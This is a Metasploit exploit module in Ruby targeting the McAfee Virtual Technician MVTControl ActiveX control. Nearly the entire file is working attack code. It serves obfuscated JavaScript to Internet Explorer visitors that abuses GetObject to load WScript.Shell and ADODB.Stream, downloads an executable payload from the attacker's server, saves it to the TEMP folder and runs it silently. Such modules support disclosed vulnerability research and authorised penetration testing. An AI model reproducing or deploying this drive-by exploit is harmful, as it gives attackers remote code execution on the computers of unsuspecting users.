# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "McAfee Virtual Technician MVTControl 6.3.0.1911 GetObject Vulnerability",
            &#039;Description&#039;    => %q{
                    This modules exploits a vulnerability found in McAfee Virtual Technician&#039;s
                MVTControl.  This ActiveX control can be abused by using the GetObject() function
                to load additional unsafe classes such as WScript.Shell, therefore allowing remote
                code execution under the context of the user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;rgod&#039;,   #Initial discovery, Poc
                    &#039;sinn3r&#039;  #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;EDB&#039;, &#039;18805&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;        => "\x00",
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039;         => "none",
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {} ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Apr 30 2012",
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def exploit
        @payload_name = rand_text_alpha(rand(6) + 5) + ".exe"
        super
    end
 
    def on_request_uri(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
 
        if agent !~ /MSIE \d/
            print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
            send_not_found(cli)
            return
        end
 
        if request.uri =~ /\.exe$/
            return if ((p=regenerate_payload(cli))==nil)
            data = generate_payload_exe({:code=>p.encoded})
            print_status("Sending payload")
            send_response(cli, data, {&#039;Content-Type&#039;=>&#039;application/octet-stream&#039;})
            return
        end
 
        # <object classid=&#039;clsid:2EBE1406-BE0E-44E6-AE10-247A0C5AEDCF&#039; id=&#039;obj&#039;></object>
        js = <<-JS
        var obj = new ActiveXObject("MVT.MVTControl.6300");
 
        var ws  = obj.GetObject("WScript.Shell");
        var ado = obj.GetObject("ADODB.Stream");
        var e   = ws.Environment("Process");
        var url = document.location + "/#{@payload_name}";
        var tmp = e.Item("TEMP") + "\\\\#{@payload_name}";
 
        var xml = new ActiveXObject("Microsoft.XMLHTTP");
        xml.open("GET", url, false);
        xml.send(null);
        res = xml.responseBody;
 
        ado.Type = 1;
        ado.Mode = 3;
        ado.Open();
        ado.Write(res);
        ado.SaveToFile(tmp);
        ws.Run(tmp, 0);
        JS
 
        js = ::Rex::Exploitation::JSObfu.new(js)
        js.obfuscate
 
        html = <<-EOS
        <html>
        <head>
        </head>
        <body>
        <script defer=defer>
        #{js}
        </script>
        </body>
        </html>
        EOS
 
        print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
 
    end
 
end



